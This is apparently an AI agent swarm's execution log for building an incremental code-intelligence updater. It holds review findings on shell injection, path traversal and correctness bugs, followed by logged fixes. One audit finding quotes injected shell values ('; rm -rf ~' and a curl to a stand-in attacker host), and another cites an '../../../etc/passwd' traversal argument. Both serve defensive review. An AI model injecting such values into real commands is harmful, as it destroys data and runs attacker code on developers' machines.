# Swarm Execution Log — intelligence_incremental_20260724

**Track:** Incremental Intelligence Layer — Always-Current, Basically-Free Repo Awareness
**Mode:** `pipeline` (sliding window assembly-line)
**Branch:** `track/intelligence_incremental_20260724`
**Oracle Cadence:** every 2 phases
**Started:** 2026-07-24T03:11:00Z

## Timeline

### [Review Phase 1] Advisory Review — 2026-07-24T03:18Z
**Reviewer:** Swarm Reviewer (pipeline advisory)
**Commit:** `cf9750e`
**Severity Summary:** 🔴 CRITICAL: 2 | 🟡 ADVISORY: 3

---

#### 🔴 CRITICAL-1 — Shell String Interpolation of Filenames in `symbol-extraction.ts`

**File:** `packages/superconductor-core/src/intelligence/runners/symbol-extraction.ts`

```typescript
targets = scopedFiles.filter(f => fs.existsSync(path.join(projectRoot, f)))
  .map(f => JSON.stringify(path.join(projectRoot, f)))
  .join(' ');

// ...then used as:
`ctags ... ${targets}`
```

`JSON.stringify` on a path produces a **quoted string** (`"path"` including the double-quotes), but those are just characters interpolated into a shell string. A filename containing `$(...)`, backticks, semicolons, or space-separated arguments can break out of the intended target boundary. This is a shell injection risk. The `lizard` runner in `complexity.ts` correctly calls `execSync` per file with `JSON.stringify(fullPath)` in isolation (each file gets its own `execSync` invocation) — `symbol-extraction.ts` must do the same, or switch to `spawnSync` with an args array.

**Impact:** Attacker-controlled filenames in a repo can achieve arbitrary code execution on the developer's machine.

---

#### 🔴 CRITICAL-2 — `dependency-graph.ts` injects un-sanitised scoped filenames into shell string (depcruise target)

**File:** `packages/superconductor-core/src/intelligence/runners/dependency-graph.ts`

```typescript
target = scopedFiles
  .filter(f => fs.existsSync(path.join(projectRoot, f)))
  .map(f => JSON.stringify(f))   // ← relative path, not absolute; still shell-interpolated
  .join(' ');

// ...then used as:
const out = execSync(`... depcruise ${target} ...`);
```

Same class of injection as CRITICAL-1. `JSON.stringify` adds literal quote characters but the result is still interpolated into a shell string. Any filename with shell metacharacters (`;`, `$()`, `&&`, etc.) breaks the boundary. Use `spawnSync` with an args array, or individually exec with validated absolute paths checked against a `projectRoot.startsWith` guard.

**Additional sub-issue:** `JSON.stringify(f)` uses the **relative** path `f` (not `path.join(projectRoot, f)`), so the path traversal guard (existsSync on absolute) is effective but the executed command uses relative paths, which may resolve differently depending on cwd.

---

#### 🟡 ADVISORY-1 — `semgrep` scoped mode uses `--include` pattern, not file targeting

**File:** `packages/superconductor-core/src/intelligence/runners/sast.ts`

```typescript
targetArgs = scopedFiles.map(f => `--include ${JSON.stringify(f)}`).join(' ') + ' ' + targetArgs;
// results in: semgrep scan --include "src/foo.ts" <projectRoot> --config=auto --json
```

`semgrep --include` is a **glob filter** on the full project scan, not direct file targeting. This means semgrep still walks the entire `projectRoot` tree — it just filters results. For large repos, the incremental performance benefit is negated. The correct approach for file-level targeting is to pass the file paths as positional arguments to `semgrep scan` directly (semgrep accepts paths as positional args). Also, `JSON.stringify(f)` here again injects into a shell string.

---

#### 🟡 ADVISORY-2 — Missing `entries` key on some non-scoped degraded return paths (type inconsistency)

**Files:** `dependency-graph.ts`, `symbol-extraction.ts`, `sast.ts`, `complexity.ts`

Non-scoped (full-scan) degraded paths return `{ status: 'degraded' }` (no `entries` key), while scoped degraded paths return `{ status: 'degraded', entries: null | [] }`. Callers that key off `result.entries` in a unified codepath will get `undefined` vs `null` inconsistency. No explicit return-type annotation (`RunnerResult` interface) enforces the contract, making this a latent bug for Phase 2 callers.

---

#### 🟡 ADVISORY-3 — `complexity.ts` scoped mode reads existing `outFile` from disk (mutable shared state)

**File:** `packages/superconductor-core/src/intelligence/runners/complexity.ts`

```typescript
if (fs.existsSync(outFile)) {
  const data = JSON.parse(fs.readFileSync(outFile, 'utf8'));
  // reads pre-existing churn data to merge with scoped results
}
```

The scoped path **reads** from the full-scan output file to back-fill existing churn data, creating a hidden coupling: scoped mode produces different results depending on whether a prior full-scan output file exists. This breaks idempotency and makes scoped results unpredictable in a clean CI environment. The churn merge logic should either receive prior state as a parameter (from caller), or the runner should document this statefulness explicitly.

---

#### ✅ Checks Passed

- All 6 runners accept `scopedFiles?: string[]` as final param ✓
- Scoped mode returns `{ status, entries }` and does not write to disk (confirmed for all 6) ✓
- `undefined` / empty `[]` scopedFiles → existing full-scan path unchanged ✓
- Non-existent scoped files are filtered with `fs.existsSync` (no throws) — confirmed for all 6 ✓
- Test file `scoped-runners.test.ts` covers backward compat (`undefined`, `[]`) and graceful degradation (nonexistent file) ✓
- `test-gaps.ts` regex bug fix (`\\s` → `\s`) is a correct improvement, unrelated to scope

---

#### Verdict

**PAUSE PHASE 2.** Two CRITICAL shell-injection issues (`symbol-extraction.ts` and `dependency-graph.ts`) must be fixed before merging. Both must switch to per-file `spawnSync` with args arrays, or individually-wrapped `execSync` calls using only verified absolute paths — never string-interpolated into the shell command.

### [Phase 2] Incremental Updater Core
**Status:** Completed
**Commit:** `ea0deee`
**Test Count:** 141 tests passing

**Advisory Notes for Phase 3:**
- The `RunnerResult` interface is now in `runners/types.ts` — Phase 3's CLI wrapper must import it when calling `update()`
- `00_manifest.json` gains `lastCommitSha` and `incrementalRuns` fields — the CLI wrapper should surface `UpdateReport` to stderr
- `mergeIntoJson` uses atomic rename — Phase 3 integration tests should verify the `.tmp` file is cleaned up on success

---

### [Oracle Cadence Check] Phases 1-2
**Auditor:** Oracle Agent (cadence audit)
**Timestamp:** 2026-07-24T03:27:00Z
**Commits audited:** `cf9750e` (Phase 1 scoped runners), `5d7c09d` (Phase 1 remediation), `ea0deee` (Phase 2 incremental updater)
**Change volume:** 21 files · +624 / -74 lines

---

#### Dimension Scores

| Dimension | Score | Notes |
|-----------|-------|-------|
| Plan Adherence | 9/10 | All Phase 1 & 2 spec tasks delivered: 6 runners gained `scopedFiles?`, `mergeIntoJson` implemented with atomic write, `update()` with `PHASE_INVALIDATION` map, `UpdateReport`, manifest tracking. Minor gap: `mergeIntoJson` sort-by-`hotspot_score` is applied only when all entries have that field; plan says "sort by hotspot_score desc" unconditionally, but non-complexity runners don't carry the field — acceptable pragmatic deviation. |
| DRY Principles | 7/10 | No gross duplication across the 6 runners. However, each runner independently re-implements the `scopedFiles && scopedFiles.length > 0` branch guard (~8–12 lines each). A shared `validateScopedFiles(projectRoot, scopedFiles)` helper would eliminate this repetition. The `update()` function also has a three-way repeated `runPipeline([], ...)` early-exit pattern (no-manifest, parse-error, stale-threshold) that could be unified into a single guard. |
| Architecture Quality | 7/10 | `IncrementalIntelligenceUpdater.update()` correctly imports and calls the 6 scoped runners directly — it does **not** delegate through `pipeline.ts` for incremental work. However, it imports `runPipeline` from `pipeline.ts` and calls it as a fallback for full-scan scenarios (no manifest, parse error, stale threshold). This is the correct design intent (fallback to full-scan), but the coupling is implicit — a caller cannot inject a mock pipeline for testing without patching the module. The test suite correctly mocks this via `vi.mock('../../src/intelligence/pipeline')`, which works but is fragile. An explicit `fullScanFn` injection parameter would be cleaner. |
| Security Posture | 8/10 | Both CRITICAL shell injections from Phase 1 review are **fully remediated**: `symbol-extraction.ts` now uses per-file `spawnSync` with args arrays and an `absPath.startsWith(resolve(projectRoot))` traversal guard. `dependency-graph.ts` now uses `spawnSync` with args arrays and validates absolute paths before use. `sast.ts`'s semgrep scoped path uses `spawnSync` with args arrays correctly. **Residual:** `trivy` in `sast.ts` (lines 130–131 and 146–148) still uses `execSync` with `JSON.stringify(fullPath)` and `JSON.stringify(projectRoot)` interpolated into a shell template string. `trivy` runs on the full `projectRoot` (not user-controlled filenames per-file), so the risk surface is lower, but `projectRoot` itself is not validated for shell metacharacters. This is a low-severity residual, not critical, since `projectRoot` is set at process startup — but consistency with the `spawnSync` pattern would eliminate it entirely. The `lizard` runner in `complexity.ts` retains `execSync` with `JSON.stringify(fullPath)` per-file — same low-severity residual as trivy (no user-controlled shell expansion since it's per pre-validated file). |
| Test Quality | 8/10 | Tests for `mergeIntoJson` are concrete and test actual file I/O (not mocked), covering merge semantics, malformed input, and atomic write. The `PHASE_INVALIDATION` tests are exhaustive over file extension variants. The `update()` tests correctly assert runner invocation counts and `phasesRun` contents. Weak spot: the `update()` tests mock all runners with `vi.fn(() => ({ status: 'ok', entries: [] }))`, which means the full incremental round-trip (runner → `mergeIntoJson` → on-disk mutation) is never tested end-to-end. An integration test asserting the actual on-disk JSON content after `update()` would close this gap. |

---

#### **Overall Score: 7.8 / 10**

**Rationale:** Phases 1 and 2 deliver a coherent, working incremental intelligence architecture with the two CRITICAL shell injections properly remediated using `spawnSync` with args arrays. Plan adherence is high — every spec task shipped. The primary systemic weakness is **incomplete adoption of the `spawnSync` pattern**: `trivy` and `lizard` still use shell-string `execSync`, creating an inconsistency that will confuse future contributors and leaves a low-severity residual. DRY debt around the repeated `scopedFiles` guard blocks and the triple early-exit `runPipeline` fallback should be addressed before Phase 3 adds more callers. Test coverage is strong on unit behaviour but lacks an end-to-end integration path.

---

#### Verdict
**✅ PROCEED to Phase 3.** The foundation is sound — scoped runners are correct, the updater is properly decoupled from the pipeline for incremental work, and the critical security remediations are in place.

---

#### Systemic Patterns — Phase 3+ Processors MUST Be Aware Of

1. **Residual `execSync` shell interpolation in `trivy` and `lizard`:** Low severity but inconsistent with the remediated runners. Phase 3's CLI wrapper should not add new `execSync`+string-interpolation patterns. All new subprocess calls must use `spawnSync` with args arrays.

2. **`trivy` in `runTrivyScan` is NOT scoped per-file at the scoped path (lines 127–135):** It iterates `scopedFiles` and calls `trivy fs <fullPath>` per file, but Trivy's `fs` subcommand scans a directory — running it on a single `.ts` file will either error or produce no findings. Phase 3 integration tests should validate that trivy scoped behaviour produces expected output, or the per-file trivy path should be skipped (trivy is dependency-level, not file-level).

3. **`update()` fallback to `runPipeline` is synchronous:** `update()` is declared `async` but the `runPipeline` fallback calls are synchronous (blocking). Phase 3's CLI wrapper must handle this correctly — if `runPipeline` is long-running, it will block the event loop. The wrapper should spawn it in a worker or child process.

4. **`mergeIntoJson` does not handle non-array top-level JSON (e.g., object from `dependency-graph`):** `dependency-graph` returns `{ nodes, edges, circularDeps }` — not an array. If Phase 3 attempts to merge dependency-graph entries via `mergeIntoJson`, it will hit the `if (!Array.isArray(existing)) { existing = [] }` guard and silently discard the existing graph. Phase 3 must use a dedicated merge strategy for non-array outputs.

5. **`complexity.ts` statefulness is documented but not guarded:** The comment added in `5d7c09d` documents the statefulness, but there is no runtime guard confirming a prior full scan has run. The `update()` function guards via the manifest check — Phase 3 must not call scoped runners directly without ensuring the manifest exists.

---

### [Review Phase 2] Advisory Review — 2026-07-24T03:27Z
**Reviewer:** Swarm Reviewer (pipeline advisory)
**Commit:** `ea0deee`
**Severity Summary:** 🔴 CRITICAL: 1 | 🟡 ADVISORY: 4

---

#### Spec Compliance Checklist

| Check | Result | Notes |
|---|---|---|
| `mergeIntoJson` uses atomic write (tmp + rename) | ✅ PASS | `${outputFile}.tmp.${Date.now()}` → `fs.renameSync` |
| Missing manifest → triggers full scan | ✅ PASS | Both `!existsSync` and `JSON.parse` catch paths call `runPipeline` |
| Phase invalidation map correct (`.ts` → 6 phases) | ✅ PASS | complexity, dep-graph, sast, symbol-extraction, test-gaps, package-surface all fire |
| Phase invalidation map correct (`package.json` → 2 phases) | ✅ PASS | fingerprint + dependency-graph only |
| Phase invalidation map correct (`.test.ts` → test-gaps only) | ✅ PASS | `complexity` excludes `.test.` / `.spec.` files |
| `incrementalRuns >= 50` → full rescan + counter reset | ⚠️ PARTIAL | Counter is reset to `0` **before** `runPipeline`, but the manifest reset is never persisted to disk in the full-rescan branch — only the incremental branch writes the manifest. Counter resets in memory only. |
| Coupling updated via `git log ${lastSha}..HEAD` | ✅ PASS | Present; errors are silently swallowed (see ADVISORY-1) |
| `00_manifest.json` updated with `lastCommitSha` + `incrementalRuns` | ⚠️ PARTIAL | Only updated in the **incremental** path. Full-rescan paths (missing manifest, parse error, >= 50 runs) return early without writing an updated manifest. |
| `UpdateReport` returned with all fields | ✅ PASS | `phasesRun`, `filesUpdated`, `durationMs`, `snapshotSha` all present in all return paths |

---

#### 🔴 CRITICAL-1 — Shell String Interpolation of `lastSha` in `git log` exec call

**File:** `packages/superconductor-core/src/intelligence/incremental-updater.ts`

```typescript
const lastSha = manifest.lastCommitSha || 'HEAD~1';
// ...
newCommits = execSync(`git log ${lastSha}..HEAD --name-only --format=format:`, { cwd: projectRoot, encoding: 'utf-8' });
```

`lastSha` is read directly from `00_manifest.json` on disk (a file that persists between runs and could be user-edited or tampered with) and is **string-interpolated into a shell command** passed to `execSync`. A malicious or corrupted value in `manifest.lastCommitSha` such as `; rm -rf ~` or `$(curl attacker.com)` achieves arbitrary shell execution. Phase 1 CRITICAL-1 and CRITICAL-2 flagged the identical pattern in runners and required `spawnSync` with an args array.

**Fix required:** Use `spawnSync('git', ['log', `${lastSha}..HEAD`, '--name-only', '--format=format:'], { cwd: projectRoot })` — never interpolate `lastSha` into a shell string. Additionally, validate `lastSha` with a SHA1 hex regex (`/^[0-9a-f]{40}$/`) before use; reject and fallback to `'HEAD~1'` if invalid.

**Impact:** If `00_manifest.json` is ever written with attacker-controlled content (e.g. via a compromised upstream snapshot, a malicious package that writes to the output dir, or a developer accidentally committing one), the next incremental update executes arbitrary shell code on the developer's machine.

---

#### 🟡 ADVISORY-1 — Coupling `git log` failure silently swallowed; error undetectable by caller

**File:** `packages/superconductor-core/src/intelligence/incremental-updater.ts`

```typescript
try {
  newCommits = execSync(`git log ${lastSha}..HEAD ...`);
} catch(e) {}
```

The inner `try/catch` with an empty catch block means any git failure (no prior commits, detached HEAD, invalid SHA, git not installed) produces an empty `newCommits` silently — `phasesRun` still includes `'coupling'` but no entries are merged. The caller sees `coupling` as "done" when it actually produced no data. This misleads monitoring/observability.

**Fix:** At minimum log the error to stderr. Better: set `newCommits = ''` but add a `warnings` array to `UpdateReport` so the caller can surface degraded phases.

---

#### 🟡 ADVISORY-2 — `incrementalRuns` counter reset not persisted in full-rescan branch

**File:** `packages/superconductor-core/src/intelligence/incremental-updater.ts`

```typescript
if (manifest.incrementalRuns >= 50) {
  manifest.incrementalRuns = 0;           // ← in-memory only
  runPipeline([], projectRoot, options.outputDir);
  return { phasesRun: ['full-scan'], ... };
  // ← manifest never written back to disk
}
```

The counter is reset to `0` in memory but the function returns early before writing the manifest. On the *next* call, `manifest.incrementalRuns` is still `50` from disk — triggering another full rescan immediately, every single run forever. The >= 50 branch effectively fires on every subsequent call once the threshold is reached.

**Fix:** Write the manifest to disk before returning in the full-rescan branch, same as the incremental path does.

---

#### 🟡 ADVISORY-3 — `update()` is `async` but `runPipeline` is called without `await`

**File:** `packages/superconductor-core/src/intelligence/incremental-updater.ts`

```typescript
export async function update(...): Promise<UpdateReport> {
  // ...
  runPipeline([], projectRoot, options.outputDir);   // ← no await
  return { ... durationMs: Date.now() - start ... };
}
```

`runPipeline` is called synchronously (no `await`). If `runPipeline` is — or becomes — async, this silently becomes a fire-and-forget that returns before the pipeline completes. `durationMs` would measure near-zero latency. The `UpdateReport` would be returned before the scan finishes, making it unreliable. Even if `runPipeline` is currently synchronous, the function signature promises async semantics and callers may `await` the result expecting completion.

**Fix:** Confirm whether `runPipeline` is synchronous or async, and either `await` it or annotate clearly that the full-scan branch returns immediately while the pipeline runs in the background (in which case `durationMs` should not be reported as the pipeline duration).

---

#### 🟡 ADVISORY-4 — `update()` does not handle `entries: null` / `undefined` from degraded runners

**File:** `packages/superconductor-core/src/intelligence/incremental-updater.ts`

```typescript
const res = runComplexity(..., changedFiles);
if (res.entries) mergeIntoJson(..., res.entries);
```

The `if (res.entries)` guard correctly skips `null`/`undefined`/empty, but Phase 1 ADVISORY-2 noted that non-scoped degraded paths return `{ status: 'degraded' }` with no `entries` key at all (i.e. `undefined`). For degraded runners the phase is silently skipped with no indication in `phasesRun` or `UpdateReport`. A degraded run looks identical to a "no matching files" skip from the caller's perspective.

**Fix:** Distinguish between "no-op (no files matched the invalidation predicate)" and "degraded (runner failed)". Add a `degradedPhases?: string[]` field to `UpdateReport`, or log the degradation to stderr.

---

#### ✅ Checks Passed

- `mergeIntoJson` atomic write: `writeFileSync` to `.tmp.${Date.now()}` then `renameSync` ✓
- Missing manifest → `runPipeline` + early return ✓
- Malformed manifest JSON → `runPipeline` + early return ✓
- `incrementalRuns >= 50` check uses `>=` (not `>`) per spec ✓
- Coupling uses `git log ${lastSha}..HEAD --name-only` ✓
- `00_manifest.json` gets `lastCommitSha` (from `git rev-parse HEAD`) + `incrementalRuns` increment ✓
- `UpdateReport` contains all 4 spec fields in all return paths ✓
- `mergeIntoJson` normalizes paths with `path.normalize` before dedup ✓
- `mergeIntoJson` sorts by `hotspot_score` descending (where key exists) ✓
- `PHASE_INVALIDATION` map tested in test file for `.ts`, `.test.ts`, `package.json` ✓
- Test coverage: missing manifest, `incrementalRuns=50`, single changed file, `mergeIntoJson` merge/dedup, atomic write ✓
- Phase runners called with `changedFiles` as `scopedFiles` parameter ✓
- No shell interpolation of `changedFiles` entries (files not used in any exec call directly) ✓

---

#### Verdict

**CONDITIONAL PROCEED.** One CRITICAL issue must be fixed before merging to main:

- 🔴 **CRITICAL-1**: `lastSha` from `manifest.lastCommitSha` is shell-interpolated into `execSync`. Switch to `spawnSync` with an args array and validate the SHA format before use.

The 3 advisories (ADVISORY-2 counter persistence, ADVISORY-3 sync/async ambiguity, ADVISORY-4 degraded-phase observability) are low-severity enough to defer to Phase 3, but ADVISORY-2 will cause a correctness regression (infinite full-rescans) if not addressed soon.

---

### [Phase 3] Git Hook & CLI Wrapper
**Status:** Completed
**Commit:** e21b1ba
**Test Count:** 142 tests passing

**Advisory Notes for Phase 4:**
- `cli-update.ts` handles the post-commit fallback cleanly but doesn't solve the ADVISORY-2 full-rescan loop inside `update()`. The `manifest.incrementalRuns = 0;` reset must be synced to disk.
- Phase 4 should fix the `lastSha` shell injection identified in Phase 2 Review.
- We modified `incremental-updater.ts` to no longer pass scoped arguments to `runPackageSurface` or expect a returned entries property from `runFingerprint`, as both do not operate per-file incrementally in the existing architecture.
- `package-surface.ts` was returning an object for `entries`, which broke the `RunnerResult` typing; this was fixed to map object entries.
- ORACLE ADVISORY: `mergeIntoJson` assumes all outputs are `{ file: string }[]` arrays, but `dependency-graph` outputs `{ nodes, edges, circularDeps }`. Phase 4 should introduce a dedicated merge strategy for non-array outputs.
- ORACLE ADVISORY: Do not introduce any new `execSync` + string interpolation patterns. Use `spawnSync`.
- ORACLE ADVISORY: `trivy fs <file.ts>` is semantically incorrect (it scans directories). Scoped trivial scanning should be skipped or stubbed instead of asserting findings.

### [Remediation] Phase 2 Critical Fix
**Status:** Completed
**Commit:** 27c5ff3
**Test Count:** 142 tests passing

---

### [Review Phase 3] Advisory Review
**Auditor:** Swarm Reviewer (pipeline assembly-line)
**Timestamp:** 2026-07-24T03:35:00Z
**Commit reviewed:** `6ebebad` — `feat(intelligence): add cli-update wrapper, git post-commit hook, and setup integration`

---

#### Checklist Results

| Item | Status | Notes |
|------|--------|-------|
| `cli-update.ts` outputs `UpdateReport` to **stderr** | ✅ PASS | `process.stderr.write(...)` on both success and error paths |
| `cli-update.ts` uses `execFileSync` (not `execSync` + string) for `git rev-parse` | ✅ PASS | `execFileSync('git', ['rev-parse', '--show-toplevel'], ...)` — args array, no interpolation |
| `cli-update.ts` exits 0 on all error paths | ✅ PASS | `.catch(e => { …; process.exit(0); })` — explicit comment explains rationale |
| `cli-update.ts` no stdout writes | ✅ PASS | No `console.log`, no `process.stdout.write` found |
| `install-git-hook.sh` idempotency marker check | ✅ PASS | `grep -q "$MARKER"` guard present before any write |
| `install-git-hook.sh` runs hook in background (`&`) | ✅ PASS | `node … $CHANGED &` in injected block |
| `install-git-hook.sh` appends to existing hook (no overwrite) | ✅ PASS | `cat >> "$HOOK_FILE"` — append redirect, not `>` |
| `setup/SKILL.md §2.7` has hook install step | ✅ PASS | Step `2a` added |
| `setup/SKILL.md §2.7` has baseline scan step | ✅ PASS | Step `2b` added |
| Integration test: modified file entries change | ⚠️ PARTIAL | Tests `filesUpdated` count but does **not** assert that the on-disk JSON entry for `file1.ts` was actually updated with new data |
| Integration test: `lastCommitSha` updates | ✅ PASS | `expect(manifest.lastCommitSha).toBe(newSha)` |
| Integration test: no `.tmp` files left | ✅ PASS | `tmpFiles.length === 0` assertion present |

---

#### Findings

##### 🔴 CRITICAL — None

No CRITICAL issues found in this commit.

---

##### 🟡 ADVISORY-1 — `$CHANGED` unquoted in hook invocation (word-splitting)

**File:** `scripts/install-git-hook.sh`, line 19 (injected into hook)
```sh
node "$(git rev-parse --show-toplevel)/packages/superconductor-core/dist/intelligence/cli-update.js" $CHANGED &
```

`$CHANGED` is **unquoted** in the `node` invocation. When filenames contain spaces (e.g., `"my component.ts"`), the shell will word-split across the space, producing two separate argv values and corrupting the file path passed to `cli-update.js`. This is a known footgun in bash scripts.

**Fix:** Use `mapfile` / `read -a` or quote the expansion:
```sh
# Option A: pass via xargs / array
CHANGED_ARRAY=()
while IFS= read -r line; do
  [[ -n "$line" ]] && CHANGED_ARRAY+=("$line")
done <<< "$CHANGED"
node "$(git rev-parse --show-toplevel)/packages/superconductor-core/dist/intelligence/cli-update.js" "${CHANGED_ARRAY[@]}" &
```

**Severity:** Advisory — only triggers on repos with space-containing filenames, but this is a real possibility for any JS project with component libraries (e.g., `"Button (v2).tsx"`).

---

##### 🟡 ADVISORY-2 — `cli-update.ts` does not validate `changedFiles` are within `projectRoot`

**File:** `packages/superconductor-core/src/intelligence/cli-update.ts`, lines 14–21

`changedFiles` is taken directly from `process.argv.slice(2)` and passed to `update()` without checking that each path resolves to a location within `projectRoot`. While the hook injects only git-tracked filenames, a manually invoked `cli-update.js ../../../etc/passwd` (or a compromised hook) could trigger runner logic on files outside the project boundary.

**Fix:** Add a validation step in `main()`:
```ts
const resolvedRoot = path.resolve(projectRoot);
const safeFiles = changedFiles.filter(f => {
  const abs = path.resolve(resolvedRoot, f);
  return abs.startsWith(resolvedRoot + path.sep);
});
```

**Severity:** Advisory — not exploitable through the normal hook flow, but a defence-in-depth gap.

---

##### 🟡 ADVISORY-3 — `incremental-updater.ts` still uses `execSync` for `git rev-parse HEAD`

**File:** `packages/superconductor-core/src/intelligence/incremental-updater.ts`, line 75
```ts
headSha = execSync('git rev-parse HEAD', { cwd: projectRoot, encoding: 'utf-8' }).trim();
```

This was flagged as a residual in the Phase 1-2 Oracle review. The `cwd: projectRoot` mitigates the most obvious attack surface (the command string itself is fixed), but the pattern is inconsistent with the `spawnSync` approach adopted by `cli-update.ts` and the remediated runners. It is not a new regression introduced in this commit, but it was not addressed during Phase 3 either.

**Fix:** Replace with `spawnSync`:
```ts
const result = spawnSync('git', ['rev-parse', 'HEAD'], { cwd: projectRoot, encoding: 'utf-8' });
headSha = (result.stdout || '').trim();
```

**Severity:** Advisory — `projectRoot` is set at process startup and is not user-controlled per-call, but pattern inconsistency creates maintenance risk.

---

##### 🟡 ADVISORY-4 — Integration test does not verify on-disk content mutation for `file1.ts`

**File:** `packages/superconductor-core/tests/intelligence/git-hook-integration.test.ts`, lines 55–75

The test asserts `report.filesUpdated === 1`, `manifest.lastCommitSha === newSha`, and no `.tmp` files — all correct. However, it does **not** assert that the content of `03_complexity.json` (or any runner output file) was actually mutated with new entries for `file1.ts`. The runner mocks are spied via `ToolRegistry` but the runners themselves are not mocked — this means the actual runner code runs, which is good. But without asserting the final JSON content, a silent "runner ran but wrote nothing" regression would pass undetected.

**Fix:** Add assertion after `update()`:
```ts
const complexity = JSON.parse(fs.readFileSync(path.join(outputDir, '03_complexity.json'), 'utf-8'));
const file1Entry = complexity.find((e: any) => e.file === 'file1.ts');
expect(file1Entry).toBeDefined(); // runner must have updated the entry
```

**Severity:** Advisory — the `.tmp` cleanup is verified (good), but the round-trip data mutation is not.

---

##### 🟡 ADVISORY-5 — `fingerprint` and `package-surface` runners silently dropped scoped-files support

**File:** `packages/superconductor-core/src/intelligence/incremental-updater.ts`, diff in this commit

This commit removed the scoped-file merge for `fingerprint` (lines 113–114) and `package-surface` (lines 155–156):

```diff
-    const res = runFingerprint(projectRoot, outputDir, registry.capabilities.fingerprint, changedFiles);
-    if (res.entries) mergeIntoJson(path.join(outputDir, '01_fingerprint.json'), res.entries);
+    runFingerprint(projectRoot, outputDir, registry.capabilities.fingerprint);
```

```diff
-    const res = runPackageSurface(projectRoot, outputDir, changedFiles);
-    if (res.entries) mergeIntoJson(path.join(outputDir, '08_package_surface.json'), res.entries);
+    runPackageSurface(projectRoot, outputDir);
```

This is a **semantic regression**: the scoped-files incremental merge (the core Phase 2 value proposition) was intentionally removed for these two runners. The runners now do a full re-scan and overwrite their output files directly, rather than calling `mergeIntoJson`. Phase 3 may have a legitimate reason (e.g., `fingerprint` and `package-surface` do not support per-file scoping), but:

1. The commit message does not document this intentional drop.
2. The integration test does not cover these two runners, so the regression is not caught by CI.
3. If unintentional, this is a correctness bug: changed files in the fingerprint/package-surface domains will trigger a full re-scan instead of a targeted merge, defeating the "basically-free" goal of the track.

**Action required:** The coder agent should confirm whether `fingerprint` and `package-surface` intentionally do not support `mergeIntoJson` (e.g., because their output format is not an array of `{ file: string }` objects). If intentional, document it in a comment. If unintentional, restore the merge calls.

**Severity:** Advisory — this is a functional correctness question, not a security issue. However, it directly impacts the spec's core incremental update goal and warrants explicit confirmation.

---

#### Severity Summary

| Severity | Count |
|----------|-------|
| 🔴 CRITICAL | 0 |
| 🟠 HIGH | 0 |
| 🟡 ADVISORY | 5 |
| ✅ PASS (spec checks) | 9/12 |

**Verdict:** Phase 3 is **clear to proceed** from a correctness and security standpoint. No CRITICAL blockers. The five advisories should be triaged before phase close:
- **ADV-1** (unquoted `$CHANGED`) and **ADV-5** (silent scoped-merge removal) are the most important to resolve.
- **ADV-2**, **ADV-3**, and **ADV-4** can be batched into a single remediation commit.

---

### [Phase 4] Universal Skill Integration
**Status:** Completed
**Commit:** fe6fbce
**Test Count:** 148 tests passing

**Advisory Notes for Phase 5 (Drift Monitor):**
- `IntelligenceSnapshotReader` exposes `driftState` ('LIVE', 'STALE', 'NONE') and `driftBanner`. The Drift Monitor should leverage this and emit the banner accordingly.
- Resolved `ADV-5` by documenting that `fingerprint` and `package-surface` produce project-level metrics rather than per-file metrics, so `mergeIntoJson` is unsupported.
- Resolved `cli-update.ts` directory traversal by validating path boundary.
- Used `spawnSync` instead of `execSync` for the `git rev-list` in `IntelligenceSnapshotReader`.


---

### [Remediation] Phase 3 Advisory Fixes — 2026-07-24T03:40Z

**Processor:** Remediation Processor (subagent)
**Commit:** `33905b8`
**Tests:** 148 passed / 148 total (0 failures)
**Branch:** `track/intelligence_incremental_20260724`

#### ADV-1 ✅ — Hook word-splitting fix (`scripts/install-git-hook.sh`)
Replaced bare `$CHANGED` expansion with a `while IFS= read -r line` array-loading pattern. Filenames with spaces are now safe. The hook is injected via `if CHANGED=$(...)` so empty output is also handled cleanly without needing `|| true`.

#### ADV-2 ✅ — Path traversal validation strengthened (`cli-update.ts`)
Replaced the `.startsWith(projectRoot)` filter (susceptible to prefix collisions, e.g. `/project-evil`) with the stricter `abs.startsWith(resolvedRoot + path.sep) || abs === resolvedRoot` check using `path.resolve` for both root and candidate. Renamed `validFiles` → `safeFiles` for clarity. Added early `process.exit(0)` when `safeFiles` is empty.

#### ADV-3 ✅ — `execSync` → `spawnSync` for HEAD SHA (`incremental-updater.ts`)
Removed shell-invoked `execSync('git rev-parse HEAD', ...)` and replaced with `spawnSync('git', ['rev-parse', 'HEAD'], ...)`. Removed `execSync` from the `child_process` import (no longer used). Errors now degrade gracefully to `headSha = 'unknown'` with a `stderr` diagnostic message. Updated `incremental-updater.test.ts` `beforeEach` to mock `spawnSync` with the correct `SpawnSyncReturns` shape.

#### ADV-4 ✅ — Round-trip on-disk assertion (`git-hook-integration.test.ts`)
Added post-`update()` assertion reading `intelligence/03_complexity.json` from disk and verifying the `file1` entry exists, proving actual file writes occurred rather than just checking the in-memory `UpdateReport.filesUpdated` count.

#### ADV-5 ✅ — Intent comments for `fingerprint` and `package-surface` (`incremental-updater.ts`)
Replaced single-line trailing ADV-5 stubs with full 3-line clarifying comment blocks placed *above* each call site, explicitly documenting why `mergeIntoJson` is inapplicable and that both runners are always full re-scans.

---

### [Oracle Cadence Check] Phases 3-4 — 2026-07-24T03:43Z

**Oracle:** Antigravity Pro (periodic cadence audit)
**Commits Audited:** `6ebebad` (Phase 3 CLI wrapper + git hook) → `4c1ba37` (HEAD, Phase 3 advisory remediation log)
**Phase 4 Commit:** `fe6fbce` (universal skill integration + IntelligenceSnapshotReader)
**Change Volume:** 882 insertions / 34 deletions across 21 files

---

#### 📋 Audit Dimensions

**1. Plan Adherence — ✅ STRONG**

All 6 skill integration points from FR-4 are present:

| Skill | Spec Location | Status |
|-------|--------------|--------|
| `setup/SKILL.md §2.7` | Hook install + full scan | ✅ `install-git-hook.sh` called; baseline scan surfaced |
| `new-track/SKILL.md §2.0.5` | Architecture Committee: load + pass snapshot | ✅ Present in §2.0.5 |
| `new-track/SKILL.md §2.3` | Plan gen: pass to SwarmBlueprintGenerator | ✅ Line 117 `IntelligenceSnapshotReader.load(outputDir)` |
| `implement/SKILL.md` | Preflight: load, banner emit, stale-trigger | ✅ §0.5 with STALE auto-refresh |
| `swarm-orchestrate/SKILL.md §1.1` | Before Wave 1: TCS scoring | ✅ TCS boost rules present |
| `standalone-review/SKILL.md` | Before dispatch: crossCuttingRisk | ✅ §5.2 with SAST injection |
| `coding-agent/SKILL.md` | Surgical Context Block | ✅ Fully spec-compliant template |

